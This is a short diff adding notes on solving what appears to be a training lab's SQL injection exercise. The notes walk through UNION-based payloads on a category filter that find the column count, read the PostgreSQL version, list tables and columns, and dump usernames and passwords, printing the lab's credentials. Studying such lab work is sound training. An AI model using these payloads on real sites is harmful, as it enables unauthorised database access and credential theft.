@@ -1,0 +1,20 @@
+Frist cause error in the request via ('):
+GET /filter?category=Pets' HTTP/2 => server respond with internal server error
+Try '' => We get 200 ok then the server is sure has sqli vulnerability.
+The union payload: ' UNION SELECT NULL -- 
+Gives us an error 
+Try to put another null column: ' UNION SELECT NULL,NULL --
+Gives us no error so the sql query is in 2 columns
+Try to know the db version :' UNION SELECT NULL,version()-- => PostgreSQL 12.16
+Try to dump all the tables: ' UNION SELECT table_name,null FROM%20 information_schema.tables --
+We found this table : user_defined_types and users_enbqoe
+dump table data with : ' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users_enbqoe'--
+We find : username_kkldyj and password_ulvmtm
+Try to get usernames and passworrd with : ' UNION SELECT username_kkldyj,password_ulvmtm FROM users_enbqoe--
+DATA:-
+wiener
+	xgelpcalr0ibiwrkahkq
+administrator
+	ziezrhr3kdulh71iqu7h
+carlos
+	51os1idbtyj5tdmjfq4k
